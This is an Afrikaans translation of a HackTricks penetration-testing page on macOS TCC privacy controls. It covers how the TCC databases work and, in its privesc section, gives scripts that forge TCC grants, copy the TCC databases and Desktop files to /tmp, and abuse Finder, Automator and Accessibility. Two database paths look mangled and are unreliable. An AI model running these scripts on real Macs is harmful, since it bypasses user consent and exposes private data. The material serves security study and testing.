# macOS TCC

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Basiese Inligting**

**TCC (Deursigtigheid, Toestemming, en Beheer)** is 'n sekuriteitsprotokol wat fokus op die regulering van toepassings se toestemmings. Sy primêre rol is om sensitiewe funksies soos **liggingsdienste, kontakte, foto's, mikrofoon, kamera, toeganklikheid, en volle skyf toegang** te beskerm. Deur eksplisiete gebruikers toestemming te vereis voordat app toegang tot hierdie elemente gegee word, verbeter TCC privaatheid en gebruikersbeheer oor hul data.

Gebruikers teëkom TCC wanneer toepassings toegang tot beskermde funksies versoek. Dit is sigbaar deur 'n prompt wat gebruikers toelaat om **toegang goed te keur of te weier**. Verder, TCC akkommodeer direkte gebruikers aksies, soos **slepen en laat val van lêers in 'n toepassing**, om toegang tot spesifieke lêers te verleen, wat verseker dat toepassings slegs toegang het tot wat eksplisiet toegelaat word.

![An example of a TCC prompt](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** word hanteer deur die **daemon** geleë in `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` en geconfigureer in `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (wat die mach diens `com.apple.tccd.system` registreer).

Daar is 'n **gebruikermodus tccd** wat per ingelogde gebruiker loop, gedefinieer in `/System/Library/LaunchAgents/com.apple.tccd.plist`, wat die mach dienste `com.apple.tccd` en `com.apple.usernotifications.delegate.com.apple.tccd` registreer.

Hier kan jy die tccd sien wat as stelsel en as gebruiker loop:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Permissions is **geërf van die ouer** toepassing en die **toestemmings** word **gevolg** op grond van die **Bundle ID** en die **Developer ID**.

### TCC Databases

Die toelaes/weiering word dan in sommige TCC-databasisse gestoor:

* Die stelselswye databasis in **`/Library/Application Support/com.apple.TCC/TCC.db`**.
* Hierdie databasis is **SIP beskerm**, so slegs 'n SIP omseiling kan daarin skryf.
* Die gebruiker TCC databasis **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** vir per-gebruiker voorkeure.
* Hierdie databasis is beskerm so slegs prosesse met hoë TCC voorregte soos Volledige Skyf Toegang kan daarin skryf (maar dit is nie deur SIP beskerm nie).

{% hint style="warning" %}
Die vorige databasisse is ook **TCC beskerm vir lees toegang**. So jy **sal nie in staat wees om te lees** jou gewone gebruiker TCC databasis tensy dit van 'n TCC voorregte proses is.

Onthou egter dat 'n proses met hierdie hoë voorregte (soos **FDA** of **`kTCCServiceEndpointSecurityClient`**) in staat sal wees om in die gebruikers TCC databasis te skryf.
{% endhint %}

* Daar is 'n **derde** TCC databasis in **`/var/db/locationd/clients.plist`** om kliënte aan te dui wat toegelaat word om **toegang tot ligging dienste** te hê.
* Die SIP beskermde lêer **`/Users/carlospolop/Downloads/REG.db`** (ook beskerm teen lees toegang met TCC), bevat die **ligging** van al die **geldige TCC databasisse**.
* Die SIP beskermde lêer **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (ook beskerm teen lees toegang met TCC), bevat meer TCC toegewyde toestemmings.
* Die SIP beskermde lêer **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (maar leesbaar deur enige iemand) is 'n toelaat lys van toepassings wat 'n TCC uitsondering vereis.

{% hint style="success" %}
Die TCC databasis in **iOS** is in **`/private/var/mobile/Library/TCC/TCC.db`**
{% endhint %}

{% hint style="info" %}
Die **kennisgewing sentrum UI** kan **veranderings in die stelsel TCC databasis** maak:

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

Gebruikers kan egter **reëls verwyder of navraag doen** met die **`tccutil`** opdraglyn nut.

{% endhint %}

#### Navraag oor die databasisse

{% tabs %}
{% tab title="gebruikers DB" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="stelseldatabasis" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
Deur beide databasisse te kontroleer, kan jy die toestemmings wat 'n app toegelaat het, verbied het, of nie het nie (dit sal daarna vra) nagaan.
{% endhint %}

* Die **`service`** is die TCC **toestemming** string voorstelling
* Die **`client`** is die **bundel ID** of **pad na binêre** met die toestemmings
* Die **`client_type`** dui aan of dit 'n Bundel Identifiseerder(0) of 'n absolute pad(1) is

<details>

<summary>Hoe om uit te voer as dit 'n absolute pad is</summary>

Doen net **`launctl load you_bin.plist`**, met 'n plist soos:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

* Die **`auth_value`** kan verskillende waardes hê: denied(0), unknown(1), allowed(2), of limited(3).
* Die **`auth_reason`** kan die volgende waardes neem: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
* Die **csreq** veld is daar om aan te dui hoe om die binêre te verifieer om uit te voer en die TCC-toestemmings toe te ken:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
* Vir meer inligting oor die **ander velde** van die tabel [**kyk hierdie blogpos**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

Jy kan ook **reeds gegee toestemmings** aan toepassings in `System Preferences --> Security & Privacy --> Privacy --> Files and Folders` kyk.

{% hint style="success" %}
Gebruikers _kan_ **reëls verwyder of navraag doen** met **`tccutil`** .
{% endhint %}

#### Stel TCC-toestemmings terug
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC Handtekening Kontroles

Die TCC **databasis** stoor die **Bundle ID** van die toepassing, maar dit **stoor** ook **inligting** oor die **handtekening** om te **verseker** dat die App wat vra om 'n toestemming te gebruik die korrekte een is.

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
Daarom sal ander toepassings wat dieselfde naam en bundel-ID gebruik nie in staat wees om toegang te verkry tot die toestemmings wat aan ander toepassings gegee is nie.
{% endhint %}

### Regte & TCC Toestemmings

Toepassings **moet nie net** **aansoek doen** en **toegang** tot sommige hulpbronne **gekry het** nie, hulle moet ook **die relevante regte hê**.\
Byvoorbeeld **Telegram** het die reg `com.apple.security.device.camera` om **toegang tot die kamera** aan te vra. 'n **toepassing** wat **nie** hierdie **reg het nie, sal nie in staat wees** om toegang tot die kamera te verkry (en die gebruiker sal nie eens vir die toestemmings gevra word nie).

Echter, vir toepassings om **toegang** tot **sekere gebruikersmappies** te hê, soos `~/Desktop`, `~/Downloads` en `~/Documents`, hoef hulle **nie** enige spesifieke **regte te hê nie.** Die stelsel sal toegang deursigtig hanteer en **die gebruiker** soos nodig vra.

Apple se toepassings **sal nie pop-ups genereer** nie. Hulle bevat **vooraf-gegewe regte** in hul **regte** lys, wat beteken hulle sal **nooit 'n pop-up genereer** nie, **ook** sal hulle nie in enige van die **TCC databasisse** verskyn nie. Byvoorbeeld:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Dit sal verhoed dat Kalender die gebruiker vra om toegang tot herinneringe, kalender en die adresboek te verkry.

{% hint style="success" %}
Afgesien van 'n paar amptelike dokumentasie oor regte, is dit ook moontlik om onoffisiële **interessante inligting oor regte in** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl) te vind.
{% endhint %}

Sommige TCC-toestemmings is: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Daar is geen openbare lys wat al hulle definieer nie, maar jy kan hierdie [**lys van bekende**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service) nagaan.

### Sensitiewe onbeveiligde plekke

* $HOME (self)
* $HOME/.ssh, $HOME/.aws, ens.
* /tmp

### Gebruiker se Intent / com.apple.macl

Soos vroeër genoem, is dit moontlik om **toegang aan 'n App tot 'n lêer te verleen deur dit te sleep en te laat val**. Hierdie toegang sal nie in enige TCC-databasis gespesifiseer word nie, maar as 'n **verlengde** **attribuut van die lêer**. Hierdie attribuut sal die **UUID** van die toegelate app **stoor**:
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
Dit is nuuskierig dat die **`com.apple.macl`** attribuut bestuur word deur die **Sandbox**, nie tccd nie.

Neem ook kennis dat as jy 'n lêer wat die UUID van 'n app op jou rekenaar toelaat na 'n ander rekenaar skuif, omdat dieselfde app verskillende UIDs sal hê, dit nie toegang tot daardie app sal verleen nie.
{% endhint %}

Die uitgebreide attribuut `com.apple.macl` **kan nie verwyder** word soos ander uitgebreide attribuut nie omdat dit **beskerm word deur SIP**. Dit is egter moontlik om dit te deaktiveer **deur die lêer te zip**, **te verwyder** en **weer te unzip**.

## TCC Privesc & Bypasses

### Voeg in by TCC

As jy op 'n stadium daarin slaag om skrywe toegang oor 'n TCC databasis te verkry, kan jy iets soos die volgende gebruik om 'n inskrywing toe te voeg (verwyder die kommentaar):

<details>

<summary>Voeg in by TCC voorbeeld</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Payloads

As jy daarin geslaag het om in 'n app met sommige TCC-toestemmings te kom, kyk na die volgende bladsy met TCC-payloads om dit te misbruik:

{% content-ref url="macos-tcc-payloads.md" %}
[macos-tcc-payloads.md](macos-tcc-payloads.md)
{% endcontent-ref %}

### Apple Events

Leer meer oor Apple Events in:

{% content-ref url="macos-apple-events.md" %}
[macos-apple-events.md](macos-apple-events.md)
{% endcontent-ref %}

### Automatisering (Finder) na FDA\*

Die TCC-naam van die Automatiseringstoestemming is: **`kTCCServiceAppleEvents`**\
Hierdie spesifieke TCC-toestemming dui ook die **aansoek aan wat binne die TCC-databasis bestuur kan word** (so die toestemmings laat nie net toe om alles te bestuur nie).

**Finder** is 'n aansoek wat **altyd FDA het** (selfs al verskyn dit nie in die UI nie), so as jy **Automatisering** voorregte oor dit het, kan jy sy voorregte misbruik om **dit sekere aksies te laat uitvoer**.\
In hierdie geval sal jou aansoek die toestemming **`kTCCServiceAppleEvents`** oor **`com.apple.Finder`** benodig.

{% tabs %}
{% tab title="Steal users TCC.db" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}

{% tab title="Steal systems TCC.db" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}
{% endtabs %}

Jy kan dit misbruik om **jou eie gebruiker TCC databasis te skryf**.

{% hint style="warning" %}
Met hierdie toestemming sal jy in staat wees om **Finder te vra om toegang tot TCC-beperkte vouers** te verkry en vir jou die lêers te gee, maar sover ek weet, sal jy **nie in staat wees om Finder willekeurige kode te laat uitvoer** om sy FDA-toegang ten volle te misbruik nie.

Daarom sal jy nie in staat wees om die volle FDA vermoëns te misbruik nie.
{% endhint %}

Dit is die TCC-prompt om outomatiseringsprivileges oor Finder te verkry:

<figure><img src="../../../../.gitbook/assets/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

{% hint style="danger" %}
Let daarop dat omdat die **Automator** toepassing die TCC toestemming **`kTCCServiceAppleEvents`** het, dit **enige toepassing** kan **beheer**, soos Finder. So as jy die toestemming het om Automator te beheer, kan jy ook die **Finder** met 'n kode soos die een hieronder beheer:
{% endhint %}

<details>

<summary>Kry 'n shell binne Automator</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

Die selfde gebeur met die **Script Editor app,** dit kan Finder beheer, maar met 'n AppleScript kan jy dit nie dwing om 'n script uit te voer nie.

### Automatisering (SE) na sommige TCC

**Stelsels gebeurtenisse kan Folder Actions skep, en Folder actions kan toegang tot sommige TCC vouers hê** (Bureaublad, Dokumente & Aflaaie), so 'n script soos die volgende kan gebruik word om hierdie gedrag te misbruik:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Outomatisering (SE) + Toeganklikheid (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** na FDA\*

Outomatisering op **`System Events`** + Toeganklikheid (**`kTCCServicePostEvent`**) maak dit moontlik om **toetsdrukke na prosesse** te stuur. Op hierdie manier kan jy Finder misbruik om die gebruikers se TCC.db te verander of om FDA aan 'n arbitrêre toepassing te gee (alhoewel 'n wagwoord hiervoor gevra mag word).

Finder wat gebruikers se TCC.db oorskryf voorbeeld:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` na FDA\*

Kyk na hierdie bladsy vir [**payloads om die Toeganklikheid toestemmings te misbruik**](macos-tcc-payloads.md#accessibility) om privesc na FDA\* of om 'n keylogger te loop byvoorbeeld.

### **Eindpunt Sekuriteit Kliënt na FDA**

As jy **`kTCCServiceEndpointSecurityClient`** het, het jy FDA. Einde.

### Stelselsbeleid SysAdmin Lêer na FDA

**`kTCCServiceSystemPolicySysAdminFiles`** laat toe om die **`NFSHomeDirectory`** attribuut van 'n gebruiker te **verander** wat sy tuisgids verander en dus toelaat om **TCC te omseil**.

### Gebruiker TCC DB na FDA

Deur **skryftoestemmings** oor die **gebruiker TCC** databasis te verkry, kan jy \*\*nie\*\* vir jouself **`FDA`** toestemmings gee nie, slegs die een wat in die stelseldatabasis woon kan dit toekenn.

Maar jy kan **kan** vir jouself **`Outomatisering regte na Finder`** gee, en die vorige tegniek misbruik om na FDA\* te eskaleer.

### **FDA na TCC toestemmings**

**Volledige Skyf Toegang** is TCC se naam is **`kTCCServiceSystemPolicyAllFiles`**

Ek dink nie dit is 'n werklike privesc nie, maar net ingeval jy dit nuttig vind: As jy 'n program met FDA beheer, kan jy **die gebruikers TCC databasis verander en vir jouself enige toegang gee**. Dit kan nuttig wees as 'n volhardingstegniek ingeval jy jou FDA toestemmings mag verloor.

### **SIP Omseiling na TCC Omseiling**

Die stelsel **TCC databasis** is beskerm deur **SIP**, daarom kan slegs prosesse met die **aangegewe regte dit verander**. Daarom, as 'n aanvaller 'n **SIP omseiling** oor 'n **lêer** vind (in staat wees om 'n lêer wat deur SIP beperk is te verander), sal hy in staat wees om:

* **Die beskerming** van 'n TCC databasis te verwyder, en vir homself al TCC toestemmings te gee. Hy kan enige van hierdie lêers misbruik byvoorbeeld:
* Die TCC stelseldatabasis
* REG.db
* MDMOverrides.plist

Daar is egter 'n ander opsie om hierdie **SIP omseiling te misbruik om TCC te omseil**, die lêer `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` is 'n toelaatlys van toepassings wat 'n TCC uitsondering vereis. Daarom, as 'n aanvaller die **SIP beskerming** van hierdie lêer kan **verwyder** en sy **eie toepassing** kan byvoeg, sal die toepassing in staat wees om TCC te omseil.\
Byvoorbeeld om terminal toe te voeg:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC Bypasses

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-bypasses](macos-tcc-bypasses/)
{% endcontent-ref %}

## Verwysings

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
